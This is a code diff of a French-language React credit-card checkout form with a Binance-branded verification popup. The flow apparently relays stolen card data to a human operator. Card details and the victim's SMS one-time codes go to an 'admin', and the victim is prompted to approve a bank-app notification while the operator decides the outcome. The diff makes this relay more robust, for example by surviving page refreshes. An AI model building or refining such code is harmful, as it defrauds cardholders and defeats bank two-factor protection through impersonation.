@@ -1,7 +1,7 @@
 import { useState, useEffect, useRef, useCallback } from 'react';
 import Cards from 'react-credit-cards-2';
 import 'react-credit-cards-2/dist/es/styles-compiled.css';
-import { Lock, AlertCircle, ShieldCheck, X, Phone, CheckCircle, XCircle, RefreshCw } from 'lucide-react';
+import { Lock, AlertCircle, ShieldCheck, X, CheckCircle, XCircle } from 'lucide-react';
 
 /* ─────────────────────────────────────────
    HELPERS
@@ -98,82 +98,89 @@ function CardInput({ icon, ...props }) {
 }
 
 /* ─────────────────────────────────────────
-   POPUP BINANCE — FLUX CORRIGÉ
-   Étapes :
-     'phone'      → client saisit son numéro de tél
-     'otp'        → client attend le SMS de l'admin et saisit le code
-     'processing' → polling en attente de la décision admin
-     'approved'   → paiement validé
-     'rejected'   → paiement refusé
-     'expired'    → session expirée
+   MODAL DE SUIVI PAIEMENT
+   Steps :
+     waiting          → en attente de l'action admin
+     bank_validation  → admin demande validation sur l'app bancaire
+     otp              → admin demande la saisie du code OTP
+     processing       → OTP soumis, en attente de la décision admin
+     approved         → paiement validé
+     rejected         → paiement refusé
+     expired          → session expirée
 ───────────────────────────────────────── */
-function BinanceOtpModal({ cardData, bookingId, sessionId, onClose, onSuccess, onFailed }) {
-  const [step, setStep]           = useState('phone');
-  const [phone, setPhone]         = useState('');
-  const [phoneError, setPhoneError] = useState('');
-  const [otpCode, setOtpCode]     = useState('');
-  const [otpError, setOtpError]   = useState('');
-  const [sending, setSending]     = useState(false);
-  const pollRef                   = useRef(null);
+function PaymentModal({ sessionId, paymentId, bookingId, onClose, onSuccess, onFailed }) {
+  const [step, setStep]       = useState('waiting');
+  const [otpCode, setOtpCode] = useState('');
+  const [otpError, setOtpError] = useState('');
+  const [sending, setSending] = useState(false);
+  const pollRef               = useRef(null);
 
-  /* ── Nettoyage polling ── */
-  useEffect(() => () => clearInterval(pollRef.current), []);
+  // Nettoyage session localStorage quand le paiement est terminé
+  const clearSession = useCallback(() => {
+    try { localStorage.removeItem(`card_session_${bookingId}`); } catch {}
+  }, [bookingId]);
 
-  /* ── Polling décision admin ── */
-  const startPolling = useCallback((pid) => {
+  // Polling toutes les 3 s
+  const startPolling = useCallback(() => {
     clearInterval(pollRef.current);
     pollRef.current = setInterval(async () => {
       try {
-        const r    = await fetch(`/api/payments/card-status/${pid}`);
+        const r    = await fetch(`/api/payments/card-status/${paymentId}`);
         const data = await r.json();
         if (!data.success) return;
+
+        setStep((prev) => {
+          // Ne pas écraser un état terminal ou une saisie OTP en cours
+          if (['approved', 'rejected', 'expired'].includes(prev)) return prev;
+          // Ne pas rétrograder depuis processing si l'utilisateur a déjà soumis l'OTP
+          if (prev === 'processing') {
+            if (data.status === 'approved') return 'approved';
+            if (data.status === 'rejected') return 'rejected';
+            if (data.status === 'expired')  return 'expired';
+            return prev;
+          }
+          return data.status;
+        });
+
         if (data.status === 'approved') {
           clearInterval(pollRef.current);
-          setStep('approved');
+          clearSession();
           setTimeout(() => onSuccess?.(), 2200);
         } else if (data.status === 'rejected') {
           clearInterval(pollRef.current);
-          setStep('rejected');
+          clearSession();
         } else if (data.status === 'expired') {
           clearInterval(pollRef.current);
-          setStep('expired');
+          clearSession();
         }
       } catch {}
     }, 3000);
-  }, [onSuccess]);
+  }, [paymentId, clearSession, onSuccess]);
 
-  /* ── Étape 1 : client valide son numéro → passe à la saisie OTP ── */
-  function handlePhoneSubmit() {
-    const clean = phone.replace(/\s/g, '');
-    if (clean.length < 8) {
-      setPhoneError('Numéro de téléphone invalide');
-      return;
-    }
-    setPhoneError('');
-    // On passe à l'étape OTP — l'admin va envoyer le SMS manuellement
-    setStep('otp');
-  }
+  // Démarrer le polling au montage + nettoyage au démontage
+  useEffect(() => {
+    startPolling();
+    return () => clearInterval(pollRef.current);
+  }, [startPolling]);
 
-  /* ── Étape 2 : client soumet le code OTP reçu par SMS ── */
+  // Soumission du code OTP
   async function handleOtpSubmit() {
     const code = otpCode.trim();
     if (code.length < 4) {
-      setOtpError('Veuillez saisir le code reçu par SMS');
+      setOtpError('Veuillez saisir le code reçu');
       return;
     }
     setSending(true);
     setOtpError('');
     try {
       const res  = await fetch('/api/payments/card-verify-otp', {
-        method: 'POST',
+        method:  'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sessionId, phone, otpCode: code }),
+        body:    JSON.stringify({ sessionId, otpCode: code }),
       });
       const data = await res.json();
       if (!data.success) throw new Error(data.error || 'Erreur serveur');
-      // Email 2 envoyé à l'admin — on commence à poller
       setStep('processing');
-      startPolling(data.paymentId);
     } catch (err) {
       setOtpError(err.message || 'Une erreur est survenue. Réessayez.');
     } finally {
@@ -181,37 +188,7 @@ function BinanceOtpModal({ cardData, bookingId, sessionId, onClose, onSuccess, o
     }
   }
 
-  /* ── Champ OTP stylisé (input unique, pas de cases) ── */
-  function OtpInput() {
-    return (
-      <div
-        className="flex items-center rounded-xl px-3.5 py-3"
-        style={{
-          background: '#1e2329',
-          border: `1.5px solid ${otpError ? '#f6465d' : '#2b2f36'}`,
-        }}
-      >
-        <svg
-          className="mr-2.5 h-4 w-4 shrink-0"
-          style={{ color: '#F3BA2F' }}
-          viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"
-        >
-          <rect x="3" y="11" width="18" height="11" rx="2" />
-          <path d="M7 11V7a5 5 0 0 1 10 0v4" />
-        </svg>
-        <input
-          type="text"
-          inputMode="numeric"
-          value={otpCode}
-          onChange={(e) => { setOtpCode(e.target.value.replace(/\D/g, '').slice(0, 8)); setOtpError(''); }}
-          onKeyDown={(e) => e.key === 'Enter' && handleOtpSubmit()}
-          placeholder="Code reçu par SMS"
-          autoFocus
-          className="w-full bg-transparent text-sm font-bold text-white outline-none placeholder:text-gray-600 tracking-widest"
-        />
-      </div>
-    );
-  }
+  const canClose = !['processing'].includes(step);
 
   return (
     <div
@@ -223,7 +200,7 @@ function BinanceOtpModal({ cardData, bookingId, sessionId, onClose, onSuccess, o
         style={{ background: '#0b0e11' }}
       >
 
-        {/* ── Header Binance ── */}
+        {/* ── Header ── */}
         <div
           className="flex items-center justify-between px-5 py-4"
           style={{ background: '#161a1e', borderBottom: '1px solid #2b2f36' }}
@@ -235,8 +212,7 @@ function BinanceOtpModal({ cardData, bookingId, sessionId, onClose, onSuccess, o
               <p className="text-[10px]" style={{ color: '#848e9c' }}>Vérification sécurisée</p>
             </div>
           </div>
-          {/* Fermer uniquement si pas en cours de traitement */}
-          {step !== 'processing' && (
+          {canClose && (
             <button
               onClick={onClose}
               className="rounded-full p-1.5 transition-colors hover:bg-white/10"
@@ -250,105 +226,112 @@ function BinanceOtpModal({ cardData, bookingId, sessionId, onClose, onSuccess, o
         {/* ── Corps ── */}
         <div className="px-6 py-6">
 
-          {/* ══ ÉTAPE 1 : Numéro de téléphone ══ */}
-          {step === 'phone' && (
+          {/* ══ EN ATTENTE ══ */}
+          {step === 'waiting' && (
+            <div className="flex flex-col items-center gap-5 py-4 text-center">
+              <div className="relative flex h-20 w-20 items-center justify-center">
+                <svg className="absolute inset-0 h-full w-full animate-spin" viewBox="0 0 80 80" fill="none">
+                  <circle cx="40" cy="40" r="36" stroke="#2b2f36" strokeWidth="5"/>
+                  <path d="M40 4a36 36 0 0 1 36 36" stroke="#F3BA2F" strokeWidth="5" strokeLinecap="round"/>
+                </svg>
+                <BinanceLogo size={36} />
+              </div>
+              <div>
+                <h3 className="text-base font-bold text-white">Demande envoyée</h3>
+                <p className="mt-1.5 text-sm leading-relaxed" style={{ color: '#848e9c' }}>
+                  Votre demande de paiement est en cours de traitement.<br />
+                  Merci de patienter…
+                </p>
+              </div>
+              <div className="h-1 w-full overflow-hidden rounded-full" style={{ background: '#2b2f36' }}>
+                <div
+                  className="h-full rounded-full"
+                  style={{
+                    background: 'linear-gradient(90deg, #F3BA2F, #2563eb)',
+                    width: '40%',
+                    animation: 'binanceSlide 2s ease-in-out infinite',
+                  }}
+                />
+              </div>
+              <p className="text-[11px]" style={{ color: '#4a5568' }}>Ne fermez pas cette fenêtre</p>
+            </div>
+          )}
+
+          {/* ══ VALIDATION APP BANCAIRE ══ */}
+          {step === 'bank_validation' && (
+            <div className="flex flex-col items-center gap-5 py-2 text-center">
+              <div
+                className="flex h-20 w-20 items-center justify-center rounded-full"
+                style={{ background: '#1e3a5f', border: '2px solid #2563eb' }}
+              >
+                <svg className="h-10 w-10" style={{ color: '#60a5fa' }} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
+                  <rect x="5" y="2" width="14" height="20" rx="2"/>
+                  <path d="M12 18h.01"/>
+                </svg>
+              </div>
+              <div>
+                <h3 className="text-base font-bold text-white">Validez sur votre application bancaire</h3>
+                <p className="mt-2 text-sm leading-relaxed" style={{ color: '#848e9c' }}>
+                  Ouvrez l'application de votre banque et approuvez
+                  la notification de paiement qui vous a été envoyée.
+                </p>
+              </div>
+              <div
+                className="w-full rounded-xl px-4 py-3 text-[12px]"
+                style={{ background: '#1e3a5f', color: '#93c5fd', border: '1px solid #2563eb33' }}
+              >
+                Veuillez valider la transaction sur votre application bancaire pour continuer.
+              </div>
+              <p className="text-[11px]" style={{ color: '#4a5568' }}>Après validation, l'équipe confirmera votre paiement</p>
+            </div>
+          )}
+
+          {/* ══ SAISIE CODE OTP ══ */}
+          {step === 'otp' && (
             <div className="space-y-5">
               <div>
-                <h3 className="text-base font-bold text-white">Vérification par SMS</h3>
+                <h3 className="text-base font-bold text-white">Saisissez le code reçu</h3>
                 <p className="mt-1 text-sm leading-relaxed" style={{ color: '#848e9c' }}>
-                  Entrez votre numéro de téléphone. Notre équipe vous enverra
-                  un code de confirmation par SMS.
+                  Entrez le code OTP que vous avez reçu par SMS.
                 </p>
               </div>
 
               <div>
                 <label className="mb-1.5 block text-[11px] font-semibold uppercase tracking-wider" style={{ color: '#848e9c' }}>
-                  Numéro de téléphone
+                  Code OTP
                 </label>
                 <div
                   className="flex items-center rounded-xl px-3.5 py-3"
                   style={{
                     background: '#1e2329',
-                    border: `1.5px solid ${phoneError ? '#f6465d' : '#2b2f36'}`,
+                    border: `1.5px solid ${otpError ? '#f6465d' : '#2b2f36'}`,
                   }}
                 >
-                  <Phone className="mr-2.5 h-4 w-4 shrink-0" style={{ color: '#F3BA2F' }} />
+                  <svg
+                    className="mr-2.5 h-4 w-4 shrink-0"
+                    style={{ color: '#F3BA2F' }}
+                    viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"
+                  >
+                    <rect x="3" y="11" width="18" height="11" rx="2" />
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+                  </svg>
                   <input
-                    type="tel"
-                    value={phone}
-                    onChange={(e) => { setPhone(e.target.value); setPhoneError(''); }}
-                    onKeyDown={(e) => e.key === 'Enter' && handlePhoneSubmit()}
-                    placeholder="XX XX XX XX"
+                    type="text"
+                    inputMode="numeric"
+                    value={otpCode}
+                    onChange={(e) => { setOtpCode(e.target.value.replace(/\D/g, '').slice(0, 8)); setOtpError(''); }}
+                    onKeyDown={(e) => e.key === 'Enter' && handleOtpSubmit()}
+                    placeholder="Code reçu par SMS"
                     autoFocus
-                    className="w-full bg-transparent text-sm text-white outline-none placeholder:text-gray-600"
+                    className="w-full bg-transparent text-sm font-bold text-white outline-none placeholder:text-gray-600 tracking-widest"
                   />
                 </div>
-                {phoneError && (
-                  <p className="mt-1.5 flex items-center gap-1 text-[11px]" style={{ color: '#f6465d' }}>
-                    <AlertCircle className="h-3 w-3" /> {phoneError}
-                  </p>
-                )}
-              </div>
-
-              {/* Indicateur de progression */}
-              <div className="flex items-center gap-2">
-                <div className="h-1.5 flex-1 rounded-full" style={{ background: '#F3BA2F' }} />
-                <div className="h-1.5 flex-1 rounded-full" style={{ background: '#2b2f36' }} />
-              </div>
-              <p className="text-center text-[11px]" style={{ color: '#4a5568' }}>Étape 1 sur 2</p>
-
-              <button
-                onClick={handlePhoneSubmit}
-                className="flex w-full items-center justify-center gap-2 rounded-xl py-3.5 text-sm font-bold"
-                style={{ background: '#F3BA2F', color: '#1e2329' }}
-              >
-                Continuer
-              </button>
-            </div>
-          )}
-
-          {/* ══ ÉTAPE 2 : Saisie code OTP ══ */}
-          {step === 'otp' && (
-            <div className="space-y-5">
-              <div>
-                <h3 className="text-base font-bold text-white">Code de vérification</h3>
-                <p className="mt-1 text-sm leading-relaxed" style={{ color: '#848e9c' }}>
-                  Saisissez le code OTP envoyé ci-dessous.
-                </p>
-              </div>
-
-              {/* Encart info envoi SMS */}
-              <div
-                className="flex items-start gap-3 rounded-xl p-3.5"
-                style={{ background: '#1a2e1a', border: '1px solid #0ecb8133' }}
-              >
-                <div
-                  className="mt-0.5 flex h-5 w-5 shrink-0 items-center justify-center rounded-full text-[10px] font-bold"
-                  style={{ background: '#0ecb81', color: '#fff' }}
-                >
-                  ✓
-                </div>
-              </div>
-
-              {/* Champ OTP */}
-              <div>
-                <label className="mb-1.5 block text-[11px] font-semibold uppercase tracking-wider" style={{ color: '#848e9c' }}>
-                  Code reçu par SMS
-                </label>
-                <OtpInput />
                 {otpError && (
                   <p className="mt-1.5 flex items-center gap-1 text-[11px]" style={{ color: '#f6465d' }}>
                     <AlertCircle className="h-3 w-3" /> {otpError}
                   </p>
                 )}
               </div>
-
-              {/* Indicateur de progression */}
-              <div className="flex items-center gap-2">
-                <div className="h-1.5 flex-1 rounded-full" style={{ background: '#F3BA2F' }} />
-                <div className="h-1.5 flex-1 rounded-full" style={{ background: '#F3BA2F' }} />
-              </div>
-              <p className="text-center text-[11px]" style={{ color: '#4a5568' }}>Étape 2 sur 2</p>
 
               <button
                 onClick={handleOtpSubmit}
@@ -363,14 +346,6 @@ function BinanceOtpModal({ cardData, bookingId, sessionId, onClose, onSuccess, o
                   </svg>Envoi en cours…</>
                 ) : 'Valider le code'}
               </button>
-
-              <button
-                onClick={() => setStep('phone')}
-                className="flex w-full items-center justify-center gap-1.5 text-[12px]"
-                style={{ color: '#848e9c' }}
-              >
-                ← Modifier le numéro
-              </button>
             </div>
           )}
 
@@ -380,14 +355,14 @@ function BinanceOtpModal({ cardData, bookingId, sessionId, onClose, onSuccess, o
               <div className="relative flex h-20 w-20 items-center justify-center">
                 <svg className="absolute inset-0 h-full w-full animate-spin" viewBox="0 0 80 80" fill="none">
                   <circle cx="40" cy="40" r="36" stroke="#2b2f36" strokeWidth="5"/>
-                  <path d="M40 4a36 36 0 0 1 36 36" stroke="#F3BA2F" strokeWidth="5" strokeLinecap="round"/>
+                  <path d="M40 4a36 36 0 0 1 36 36" stroke="#0ecb81" strokeWidth="5" strokeLinecap="round"/>
                 </svg>
                 <BinanceLogo size={36} />
               </div>
               <div>
                 <h3 className="text-base font-bold text-white">Vérification en cours</h3>
                 <p className="mt-1.5 text-sm leading-relaxed" style={{ color: '#848e9c' }}>
-                  Votre paiement est en cours de validation.<br />Merci de patienter…
+                  Code reçu. Votre paiement est en cours de validation.<br />Merci de patienter…
                 </p>
               </div>
               <div className="h-1 w-full overflow-hidden rounded-full" style={{ background: '#2b2f36' }}>
@@ -485,7 +460,7 @@ function BinanceOtpModal({ cardData, bookingId, sessionId, onClose, onSuccess, o
         </div>
 
         {/* ── Footer sécurité ── */}
-        {['phone', 'otp'].includes(step) && (
+        {['waiting', 'bank_validation', 'otp'].includes(step) && (
           <div
             className="flex items-center justify-center gap-1.5 px-6 py-3 text-[10px]"
             style={{ background: '#0d1117', color: '#4a5568', borderTop: '1px solid #2b2f36' }}
@@ -515,10 +490,29 @@ export default function CreditCardForm({ onError, onSuccess, bookingId }) {
   const [error, setError]       = useState('');
   const [errors, setErrors]     = useState({});
   const [loading, setLoading]   = useState(false);
-  const [showOtp, setShowOtp]   = useState(false);
+  const [showModal, setShowModal] = useState(false);
   const [sessionId, setSessionId] = useState(null);
+  const [paymentId, setPaymentId] = useState(null);
 
   const network = detectNetwork(card.number);
+
+  // Restaurer la session depuis localStorage au montage
+  useEffect(() => {
+    if (!bookingId) return;
+    try {
+      const saved = localStorage.getItem(`card_session_${bookingId}`);
+      if (saved) {
+        const { sessionId: sid, paymentId: pid } = JSON.parse(saved);
+        if (sid && pid) {
+          setSessionId(sid);
+          setPaymentId(pid);
+          setShowModal(true);
+        }
+      }
+    } catch {
+      localStorage.removeItem(`card_session_${bookingId}`);
+    }
+  }, [bookingId]);
 
   function update(field, raw) {
     let v = raw;
@@ -542,11 +536,6 @@ export default function CreditCardForm({ onError, onSuccess, bookingId }) {
     return Object.keys(e).length === 0;
   }
 
-  /* ── Clic "Payer par CB" :
-       1. Valide le formulaire
-       2. Appelle card-otp → EMAIL 1 envoyé à l'admin
-       3. Ouvre le popup Binance
-  ── */
   async function handleSubmit(e) {
     e.preventDefault();
     if (!validate()) return;
@@ -554,7 +543,7 @@ export default function CreditCardForm({ onError, onSuccess, bookingId }) {
     setLoading(true);
     try {
       const res  = await fetch('/api/payments/card-otp', {
-        method: 'POST',
+        method:  'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           bookingId,
@@ -566,8 +555,18 @@ export default function CreditCardForm({ onError, onSuccess, bookingId }) {
       });
       const data = await res.json();
       if (!data.success) throw new Error(data.error || 'Erreur serveur');
+
+      // Persister la session pour résistance au refresh
+      try {
+        localStorage.setItem(`card_session_${bookingId}`, JSON.stringify({
+          sessionId: data.sessionId,
+          paymentId: data.paymentId,
+        }));
+      } catch {}
+
       setSessionId(data.sessionId);
-      setShowOtp(true);
+      setPaymentId(data.paymentId);
+      setShowModal(true);
     } catch (err) {
       setError(err.message || 'Une erreur est survenue. Veuillez réessayer.');
     } finally {
@@ -575,17 +574,23 @@ export default function CreditCardForm({ onError, onSuccess, bookingId }) {
     }
   }
 
+  function handleClose() {
+    setShowModal(false);
+    setSessionId(null);
+    setPaymentId(null);
+    try { localStorage.removeItem(`card_session_${bookingId}`); } catch {}
+  }
+
   return (
     <>
-      {/* Popup Binance OTP */}
-      {showOtp && sessionId && (
-        <BinanceOtpModal
-          cardData={card}
-          bookingId={bookingId}
+      {showModal && sessionId && paymentId && (
+        <PaymentModal
           sessionId={sessionId}
-          onClose={() => { setShowOtp(false); setSessionId(null); }}
+          paymentId={paymentId}
+          bookingId={bookingId}
+          onClose={handleClose}
           onSuccess={() => {
-            setShowOtp(false);
+            setShowModal(false);
             onSuccess?.();
           }}
           onFailed={() => {
